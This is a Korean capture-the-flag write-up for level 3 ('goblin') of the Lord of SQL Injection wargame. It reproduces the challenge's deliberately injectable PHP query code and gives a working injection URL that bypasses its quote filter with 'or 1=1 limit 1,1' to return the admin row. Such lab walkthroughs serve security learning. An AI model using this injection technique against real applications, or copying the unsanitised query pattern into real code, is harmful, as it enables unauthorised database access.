Lord of SQL Injection No.3 - goblin
=============
```
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__);
?>
```
위 문제에서 알 수 있는 것
-------------
preg_match에 의해 $_GET[no]값에 . ()가 들어가면 No Hack ~_~가 뜨면서 문제풀이에 실패하는 것을 알 수 있다.
또한 $_GET[no]값에 ' " `가 들어가면 No Qutes ~_~가 뜨면서 문제풀이에 실패하는 것을 알 수 있다.
$result['id']가 admin이면 문제가 풀리는 것을 알 수 있다.

문제 풀이 법
-------------
1. Limit 구문 활용
http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=2%20or%201=1%20limit%201,1
id값이 guest로 고정 되어 있으므로 값을 입력할수있는 no에 값을 입력해서 뚫어야한다.
no에 아무 값을 넣어주고 참이 되게 만들어준후 limit구문을 써준다.
limit 0,1(0번째 레코드에서 1개의 값을 불러오는 구문)을 넣었을때 Hello guest가 뜨므로 첫번째 값이 id라는 것을 추측할수있다.
각 레코드의 첫번째 값이 id이므로 레코드 순서를 바꾸어 가며 실행시켜본다.
limit 1,1 limit 2,1 이런식으로 말이다. 이 문제에서는 limit 1,1을 실행시켜보자 바로 풀리게된다.(python코드로 푸는것도 괜찮을것같다.)
